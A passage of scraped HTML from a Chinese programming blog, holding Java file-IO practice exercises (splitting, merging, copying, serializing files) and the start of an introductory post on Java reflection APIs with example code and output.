class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br></pre></td><td class="code"><pre><span class="line">//作业1：以字节流的形式向文件写入数据 当多级目录与文件不存在 都会创建</span><br><span class="line">File f1 = new File(&quot;C:/Java/demo1/aaa/test1.txt&quot;);</span><br><span class="line"></span><br><span class="line">File file_dic = f1.getParentFile();</span><br><span class="line">if (!file_dic.exists())&#123;</span><br><span class="line">	file_dic.mkdirs();      //多级目录不存在 都会创建</span><br><span class="line">&#125;</span><br><span class="line">FileOutputStream fos = new FileOutputStream(f1);</span><br><span class="line"></span><br><span class="line">byte[] data = &#123;49,50,51&#125;;  //写入ascii为49，50的字符(1 2)</span><br><span class="line">fos.write(data);</span><br><span class="line">fos.close();</span><br><span class="line"></span><br><span class="line">//作业2：找一个大小为100k以上的文件 按照100k为单位，拆分为多个子文件 编号为子文件名</span><br><span class="line">File f1 = new File(&quot;C:/Java/demo/test1.txt&quot;);</span><br><span class="line">FileInputStream fos = new FileInputStream(f1);</span><br><span class="line">byte[] data = new byte[(int)f1.length()];</span><br><span class="line">fos.read(data);</span><br><span class="line">System.out.println(f1.length());</span><br><span class="line">int size = 100*1024;</span><br><span class="line">for (int i = 0;i &lt; f1.length();i += size)&#123;</span><br><span class="line">if (i != 0 &amp;&amp; i % size == 0)&#123;</span><br><span class="line">	String fileName = &quot;C:/Java/demo/small&quot;+(i/size)+&quot;.txt&quot;;</span><br><span class="line">	File f2 = new File(fileName);</span><br><span class="line">	System.out.println(&quot;文件:&quot;+fileName);</span><br><span class="line">	FileOutputStream fos2 = new FileOutputStream(f2);</span><br><span class="line">	fos2.write(data,i-size,size);</span><br><span class="line">	fos2.close();</span><br><span class="line">&#125;</span><br><span class="line">if ((i/size) == (f1.length()/size) )&#123;</span><br><span class="line">	String fileName1 = &quot;C:/Java/demo/small&quot;+(i/size+1)+&quot;.txt&quot;;</span><br><span class="line">	File f3 = new File(fileName1);</span><br><span class="line">	System.out.println(&quot;最后一个文件:&quot;+fileName1);</span><br><span class="line">	FileOutputStream fos3 = new FileOutputStream(f3);</span><br><span class="line">	fos3.write(data,i, (int) (f1.length()-i));</span><br><span class="line">	fos3.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//作业3:合并文件 (将刚才拆分的文件合并)</span><br><span class="line">File f1 = new File(&quot;c:/java/demo&quot;);</span><br><span class="line">File resultFile = new File(&quot;c:/java/demo/test.txt&quot;);</span><br><span class="line">File[] files = f1.listFiles();</span><br><span class="line">FileInputStream fis = null;</span><br><span class="line">FileOutputStream fos = null;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for (File f2 : files)&#123;</span><br><span class="line">	if (f2.isFile() &amp;&amp; f2.getName().contains(&quot;small&quot;))&#123;</span><br><span class="line">		byte[] data = new byte[(int) f2.length()];</span><br><span class="line">		try &#123;</span><br><span class="line">			fos = new FileOutputStream(resultFile,true);  //追加方式</span><br><span class="line">			fis = new FileInputStream(f2);</span><br><span class="line">			fis.read(data);</span><br><span class="line">			fos.write(data,0, (int) f2.length());</span><br><span class="line">			System.out.println(&quot;已经将&quot;+f2.getName()+&quot;文件内容写入&quot;+resultFile.getName()+&quot;文件&quot;);</span><br><span class="line">		&#125;catch (IOException e)&#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;finally &#123;</span><br><span class="line">			//使用finally关闭流</span><br><span class="line">			if (null != fis)&#123;</span><br><span class="line">				try &#123;</span><br><span class="line">					fis.close();</span><br><span class="line">				&#125; catch (IOException e) &#123;</span><br><span class="line">					e.printStackTrace();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			if (null != fos)&#123;</span><br><span class="line">				try &#123;</span><br><span class="line">					fos.close();</span><br><span class="line">				&#125; catch (IOException e) &#123;</span><br><span class="line">					e.printStackTrace();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//练习4：移除指定文件的//注释</span><br><span class="line">String fileName = &quot;c:/java/demo/comments.txt&quot;;</span><br><span class="line">File f1 = new File(fileName);</span><br><span class="line">new RemoveCommentClass().removeComments(f1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class RemoveCommentClass&#123;</span><br><span class="line">    //移除指定文件的 //注释</span><br><span class="line">   public void removeComments(File f1)&#123;</span><br><span class="line">        File f2 = new File(f1.getName()+&quot;-temp&quot;);  //临时文件</span><br><span class="line">        try (   FileReader fr = new FileReader(f1);</span><br><span class="line">                BufferedReader br = new BufferedReader(fr);</span><br><span class="line">                FileWriter fw = new FileWriter(f2);</span><br><span class="line">                PrintWriter pw = new PrintWriter(fw);)&#123;</span><br><span class="line">            while (true)&#123;</span><br><span class="line">                String line = br.readLine();</span><br><span class="line">                if (null == line)</span><br><span class="line">                    break;</span><br><span class="line">                if (!line.trim().startsWith(&quot;//&quot;))&#123;</span><br><span class="line">                    System.out.println(line);</span><br><span class="line">                    pw.write(line+&quot;\n&quot;);</span><br><span class="line">                    pw.flush();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        f1.delete();</span><br><span class="line">        f2.renameTo(f1);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//练习5：将一个Hero数组序列化写入文件  再从文件中反序列化读出</span><br><span class="line">Hero[] heroes = new Hero[10];</span><br><span class="line">for (int i = 0; i &lt; 10; i++) &#123;</span><br><span class="line">	heroes[i] = new Hero(&quot;Hero &quot;+i);</span><br><span class="line">&#125;</span><br><span class="line">File file = new File(&quot;c:/java/demo/1.bin&quot;);</span><br><span class="line">try (FileOutputStream fos = new FileOutputStream(file);</span><br><span class="line">	 ObjectOutputStream oos = new ObjectOutputStream(fos);   //输出流</span><br><span class="line"></span><br><span class="line">	 //输入流</span><br><span class="line">	 FileInputStream fis = new FileInputStream(file);</span><br><span class="line">	 ObjectInputStream ois = new ObjectInputStream(fis);</span><br><span class="line">) &#123;</span><br><span class="line">	oos.writeObject(heroes);</span><br><span class="line">	Hero[] heroes2 = (Hero[]) ois.readObject();</span><br><span class="line">	for (Hero h : heroes2) &#123;</span><br><span class="line">		System.out.println(h.name.toString());</span><br><span class="line">	&#125;</span><br><span class="line">&#125; catch (IOException e) &#123;</span><br><span class="line">	e.printStackTrace();</span><br><span class="line">&#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">	e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Hero implements Serializable&#123;</span><br><span class="line">    public int id;</span><br><span class="line">    public String name;</span><br><span class="line"></span><br><span class="line">    public Hero(String name) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//练习6：写一个自动创建类的类</span><br><span class="line">//模板类</span><br><span class="line">String str1 = &quot;public class @class@ &#123;\n&quot; +</span><br><span class="line">		&quot;    private @type@ @property@;\n&quot; +</span><br><span class="line">		&quot;    public @class@() &#123;\n&quot; +</span><br><span class="line">		&quot;    &#125;\n&quot; +</span><br><span class="line">		&quot;    public void set@Uproperty@(@type@ @property@)&#123;\n&quot; +</span><br><span class="line">		&quot;        this.@property@ = @property@;\n&quot; +</span><br><span class="line">		&quot;    &#125;\n&quot; +</span><br><span class="line">		&quot;      \n&quot; +</span><br><span class="line">		&quot;    public @type@ get@Uproperty@()&#123;\n&quot; +</span><br><span class="line">		&quot;        return this.@property@;\n&quot; +</span><br><span class="line">		&quot;    &#125;\n&quot; +</span><br><span class="line">		&quot;&#125;&quot;;</span><br><span class="line">File file = new File(&quot;c:/java/demo/1.java&quot;);</span><br><span class="line"></span><br><span class="line">//获取输入</span><br><span class="line">Scanner scanner = new Scanner(System.in);</span><br><span class="line">System.out.println(&quot;Please input ClassName:&quot;);</span><br><span class="line">String className = scanner.nextLine();</span><br><span class="line">System.out.println(&quot;Please input type:&quot;);</span><br><span class="line">String type = scanner.nextLine();</span><br><span class="line">System.out.println(&quot;Please input property:&quot;);</span><br><span class="line">String property = scanner.nextLine();</span><br><span class="line"></span><br><span class="line">//替换</span><br><span class="line">str1 = str1.replace(&quot;@class@&quot;,className).replace(&quot;@type@&quot;,type).replace(&quot;@property@&quot;,property).replace(&quot;@Uproperty@&quot;,property.substring(0,1).toUpperCase()+property.substring(1));</span><br><span class="line"></span><br><span class="line">//写入文件</span><br><span class="line">char[] chars = new char[(int) file.length()];</span><br><span class="line">try (FileWriter fw = new FileWriter(file);</span><br><span class="line">	FileReader fr = new FileReader(file);</span><br><span class="line">) &#123;</span><br><span class="line">	fw.write(str1);</span><br><span class="line">	fw.flush();</span><br><span class="line">	fr.read(chars);</span><br><span class="line">	for (char c : chars)&#123;</span><br><span class="line">		System.out.println(c);</span><br><span class="line">	&#125;</span><br><span class="line">&#125; catch (IOException e) &#123;</span><br><span class="line">	e.printStackTrace();</span><br><span class="line">&#125; &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">练习7：复制文件  复制文件夹   查找文件内容</span><br><span class="line"></span><br><span class="line">class Exercise &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //copyFile(&quot;c:/java/demo/1.txt&quot;, &quot;c:/java/demo/2.txt&quot;);  复制文件</span><br><span class="line">        //copyFolder(&quot;C:/Java/demo&quot;, &quot;C:/Java/demo1&quot;);   复制文件夹</span><br><span class="line">        //search(new File(&quot;C:/Java/demo&quot;), &quot;123&quot;);    查找文件内容</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static void copyFile(String srcFile, String destFile) &#123;</span><br><span class="line">        File f1 = new File(srcFile);</span><br><span class="line">        File f2 = new File(destFile);</span><br><span class="line"></span><br><span class="line">        try (FileReader fr = new FileReader(f1);</span><br><span class="line">             FileWriter fw = new FileWriter(f2);) &#123;</span><br><span class="line">            char[] chars = new char[(int) f1.length()];</span><br><span class="line">            fr.read(chars);</span><br><span class="line">            fw.write(chars);</span><br><span class="line">            fw.flush();</span><br><span class="line">        &#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;复制成功，源文件:&quot; + f1.getName() + &quot;\n目标文件:&quot; + f2.getName());</span><br><span class="line">        //System.out.println(&quot;文件内容:&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    static void copyFolder(String srcFolder, String destFolder) &#123;</span><br><span class="line">        File f1 = new File(srcFolder);</span><br><span class="line">        File f2 = new File(destFolder);</span><br><span class="line">        if (!f2.exists())</span><br><span class="line">            f2.mkdirs();</span><br><span class="line"></span><br><span class="line">        File[] files3 = f1.listFiles();</span><br><span class="line">        if (files3 != null) &#123;</span><br><span class="line">            for (File file3 : files3) &#123;</span><br><span class="line">                if(file3.isFile()) &#123;</span><br><span class="line">                    File newdestFile = new File(destFolder,file3.getName());</span><br><span class="line">                    copyFile(file3.getAbsolutePath(),newdestFile.getAbsolutePath());</span><br><span class="line">                &#125;</span><br><span class="line">                if(file3.isDirectory())&#123;</span><br><span class="line">                    File newdestFolder = new File(destFolder,file3.getName());</span><br><span class="line">                    copyFolder(file3.getAbsolutePath(),newdestFolder.getAbsolutePath());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;复制成功，源目录:&quot;+f1.getName()+&quot;\n目标目录:&quot;+f2.getName());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line">        static void search(File folder, String keyword)&#123;</span><br><span class="line">            //在一个文件中找key的方法</span><br><span class="line">            //在目录中重复调用方法1</span><br><span class="line">        &#125;</span><br><span class="line">        */</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    static void search(File folder,String keyword)&#123;</span><br><span class="line">        if (folder.isFile())</span><br><span class="line">            fileSearch(folder,keyword);</span><br><span class="line">        else if(folder.isDirectory())&#123;</span><br><span class="line">            File[] files = folder.listFiles();</span><br><span class="line">            for (File file : files)</span><br><span class="line">                search(file,keyword);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    static void fileSearch(File file,String keyword)&#123;</span><br><span class="line">        try(FileReader fr = new FileReader(file);</span><br><span class="line">            BufferedReader br = new BufferedReader(fr);)&#123;</span><br><span class="line">            while (true)&#123;</span><br><span class="line">                String line = br.readLine();</span><br><span class="line">                if (null == line)</span><br><span class="line">                    break;</span><br><span class="line">                if (line.contains(keyword))</span><br><span class="line">                    System.out.println(&quot;包含&quot;+keyword+&quot;的文件:&quot;+file.getAbsolutePath());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p>在IO操作中，无论是输出流还是输入流在用完都应该关闭，否则会造成资源浪费。在业务量大时，甚至会影响业务的正常开展。<br>对于关闭的方式有(<strong>try中关闭、finally关闭、try()中关闭</strong>)三种方式，其中第三种try()在JDK7开始支持且比较简单，在练习题中也使用了，比较推荐使用。</p>
</blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/31/Java反射机制/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/31/Java反射机制/" itemprop="url">Java认识 反射</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-31T08:15:41+08:00">
                2019-03-31
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>复现序列化漏洞时涉及到了Java反射机制，特学习总结下。</p>
</blockquote>
<hr>
<h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><h2 id="反射简介"><a href="#反射简介" class="headerlink" title="反射简介"></a>反射简介</h2><p><strong>反射（Reflection）是Java的特征之一，它允许运行中的java程序获取自身的信息，并且可以操作类或对象的内部属性</strong>。<br>Oracle官网对其<a href="https://docs.oracle.com/javase/8/docs/technotes/guides/reflection/" target="_blank" rel="noopener">其</a>描述：                </p>
<blockquote>
<p>Reflection enables Java code to discover information about the fields, methods and constructors of loaded classes, and to use reflected fields, methods, and constructors to operate on their underlying counterparts, within security restrictions. The API accommodates applications that need access to either the public members of a target object (based on its runtime class) or the members declared by a given class. It also allows programs to suppress default reflective access control.</p>
</blockquote>
<p>简单来说就是我们可以在程序运行过程中获取类成员及成员信息</p>
<p>Java反射提供的功能:            </p>
<blockquote>
<p>在运行时判断任意一个对象所属的类(getClass方法)<br>在运行时可根据类名构造任意一个类的对象(Class c = Class.forName(className);)<br>在运行时可判断任意一个类所具有的成员变量及方法<br>在运行时调用任意一个对象的方法</p>
</blockquote>
<h3 id="类与反射"><a href="#类与反射" class="headerlink" title="类与反射"></a>类与反射</h3><blockquote>
<p>在反射中要明白的一个概念是类与实例的关系，即Class与Instance(类是定义，实例是在内存中实际存在的对象)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt;	类的Java对象		</span><br><span class="line">Object		实例的Java对象</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>一个类可以有多个实例(new)，操作某个成员变量或者方法，从类中获得并在实例中执行。以方法为例，因为<strong>方法是在类中定义，所有实例都有这个方法，所以在执行时(invoke)要指定哪个实例执行</strong></p>
<h3 id="获取类对象"><a href="#获取类对象" class="headerlink" title="获取类对象"></a>获取类对象</h3><p><strong>获取类对象</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class ReflectionMain&#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String str = &quot;Hello world&quot;;</span><br><span class="line"></span><br><span class="line">        //获取类对象的三种方法</span><br><span class="line">        //用Class类的forName静态方法</span><br><span class="line">        Class c1 = Class.forName(&quot;java.lang.String&quot;);</span><br><span class="line"></span><br><span class="line">        //类的对象的getClass方法</span><br><span class="line">        Class c2 = str.getClass();</span><br><span class="line"></span><br><span class="line">        //通过类的class属性</span><br><span class="line">        Class c3 = String.class;</span><br><span class="line"></span><br><span class="line">        System.out.println(c1.getName()); //java.lang.String</span><br><span class="line">        System.out.println(c2.getName()); //java.lang.String</span><br><span class="line">        System.out.println(c3.getName()); //java.lang.String</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="获取类的构造器"><a href="#获取类的构造器" class="headerlink" title="获取类的构造器"></a>获取类的构造器</h3><p>有4个方法:    </p>
<blockquote>
<p>//根据指定参数获得public构造器<br>Constructor getConstructor(Class[] params);<br>//获得public的所有构造器<br>Constructor[] getConstructors();<br>//根据指定参数获得public和非public的构造器<br>Constructor getDeclaredConstructor(Class[] params);<br>//获取所有public和非public的构造器<br>Constructor[] getDeclaredConstructors();</p>
</blockquote>
<p>创建一个User类(含几个构造方法):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class RefUser&#123;</span><br><span class="line">    private int id;</span><br><span class="line">    private String name;</span><br><span class="line">    private String pwd;</span><br><span class="line"></span><br><span class="line">    public RefUser()&#123;&#125;</span><br><span class="line">    public RefUser(int id)&#123;</span><br><span class="line">        this.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    private RefUser(String name)&#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    public RefUser(int id,String name,String pwd)&#123;</span><br><span class="line">        super();</span><br><span class="line">        this.id = id;</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.pwd = pwd;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>获取类的构造方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">class ReflectionMain&#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Class c = RefUser.class;</span><br><span class="line">        //获取public修饰的构造方法集合</span><br><span class="line">        Constructor[] constructors1 = c.getConstructors();</span><br><span class="line">        for (Constructor constructor1 : constructors1)&#123;</span><br><span class="line">            System.out.println(constructor1);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;-----------------------&quot;);</span><br><span class="line">        //获取全部构造方法集合</span><br><span class="line">        Constructor[] constructors2 = c.getDeclaredConstructors();</span><br><span class="line">        for (Constructor constructor2 : constructors2)&#123;</span><br><span class="line">            System.out.println(constructor2);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;-----------------------&quot;);</span><br><span class="line">        //根据传入的参数获取单个构造方法(public修饰)</span><br><span class="line">        Class cls1[] = new Class[] &#123; int.class &#125;;  //paramTypes</span><br><span class="line">        Constructor constructor1 = c.getConstructor(cls1);</span><br><span class="line">        System.out.println(constructor1);</span><br><span class="line">        System.out.println(&quot;-----------------------&quot;);</span><br><span class="line">        //根据传入的参数获取单个构造方法(全部)</span><br><span class="line">        Class cls2[] = new Class[] &#123; String.class &#125;;</span><br><span class="line">        Constructor constructor2 = c.getDeclaredConstructor(cls2);</span><br><span class="line">        System.out.println(constructor2);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">输出:</span><br><span class="line">public RefUser(int,java.lang.String,java.lang.String)</span><br><span class="line">public RefUser(int)</span><br><span class="line">public RefUser()</span><br><span class="line">-----------------------</span><br><span class="line">public RefUser(int,java.lang.String,java.lang.String)</span><br><span class="line">private RefUser(java.lang.String)</span><br><span class="line">public RefUser(int)</span><br><span class="line">public RefUser()</span><br><span class="line">-----------------------</span><br><span class="line">public RefUser(int)</span><br><span class="line">-----------------------</span><br><span class="line">private RefUser(java.lang.String)</span><br></pre></td></tr></table></figure></p>
<p>可看到使用<code>getDeclaredConstructors</code>与<code>getDeclaredConstructor</code>可获取到包括private的构造方法。        </p>
<h3 id="创建实例"><a href="#创建实例" class="headerlink" title="创建实例"></a>创建实例</h3><blockquote>
<p>通过反射来创建对象一般有两种方式，一种是Class对象的newInstance来创建Class对象对应的实例；第二种是先通过Class对象获取指定的Constructor对象，再调用Constructor对象的newInstance来创建实例。(<strong>由类名得到类的实例</strong>)            </p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-31.12.22.44-image.png" alt="2019-03-31.12.22.44-image.png"></p>
<p>我们可以看到第二个方法可以用指定的构造器构造类的实例，平常用的比较多。        </p>
<h3 id="获取类声明的方法"><a href="#获取类声明的方法" class="headerlink" title="获取类声明的方法"></a>获取类声明的方法</h3><blockquote>
<p>Field getField(String name)   获取指定名字的公共属性<br>Field[] getFields()               获取全部公共属性<br>Field getDeclaredField(String name)  获取单个属性(可获取private修饰的属性)<br>Field[] getDeclaredFields()       获取全部属性</p>
</blockquote>
<p>设置几个属性值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class RefUser&#123;</span><br><span class="line">    private int id = 1;</span><br><span class="line">    public String name = &quot;P0rZ9&quot;;</span><br><span class="line">    private String sex = &quot;男&quot;;</span><br><span class="line">    String pwd = &quot;admin&quot;;</span><br></pre></td></tr></table></figure></p>
<p>获取类声明测试:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Class c = RefUser.class;</span><br><span class="line">        try &#123;</span><br><span class="line">            //获取单个公共属性</span><br><span class="line">            System.out.println(&quot;单个公共属性:&quot;);</span><br><span class="line">            Field f1 = c.getField(&quot;name&quot;);</span><br><span class="line">            System.out.println(f1);</span><br><span class="line"></span><br><span class="line">            //获取全部公共属性</span><br><span class="line">            Field[] fields1 = c.getFields();</span><br><span class="line">            System.out.println(&quot;全部公共属性:&quot;);</span><br><span class="line">            for (Field field : fields1)&#123;</span><br><span class="line">                System.out.println(field);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            //获取单个属性(可为private)</span><br><span class="line">            System.out.println(&quot;单个属性:&quot;);</span><br><span class="line">            Field f2 = c.getDeclaredField(&quot;sex&quot;);</span><br><span class="line">            System.out.println(f2);</span><br><span class="line"></span><br><span class="line">            //获取全部属性</span><br><span class="line">            Field[] fields2 = c.getDeclaredFields();</span><br><span class="line">            System.out.println(&quot;全部属性:&quot;);</span><br><span class="line">            for (Field field : fields2)&#123;</span><br><span class="line">                System.out.println(field);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">输出:			</span><br><span class="line">单个公共属性:</span><br><span class="line">public java.lang.String RefUser.name</span><br><span class="line">全部公共属性:</span><br><span class="line">public java.lang.String RefUser.name</span><br><span class="line">单个属性:</span><br><span class="line">private java.lang.String RefUser.sex</span><br><span class="line">全部属性:</span><br><span class="line">private int RefUser.id</span><br><span class="line">public java.lang.String RefUser.name</span><br><span class="line">private java.lang.String RefUser.sex</span><br><span class="line">java.lang.String RefUser.pwd</span><br></pre></td></tr></table></figure></p>
<h3 id="获取类的方法对象"><a href="#获取类的方法对象" class="headerlink" title="获取类的方法对象"></a>获取类的方法对象</h3><blockquote>
<p>Method getMethod(“func_name”, Class[] params) 使用特定参数类型，获得命名的公共方法<br>method[] getMethods()    获取类的所有公共方法<br>Method getDeclaredMethod(String name,Class[] params) 获得单个方法(包括private)<br>Method[] getDeclaredMethods()  获得所有方法</p>
</blockquote>
<h3 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h3><blockquote>
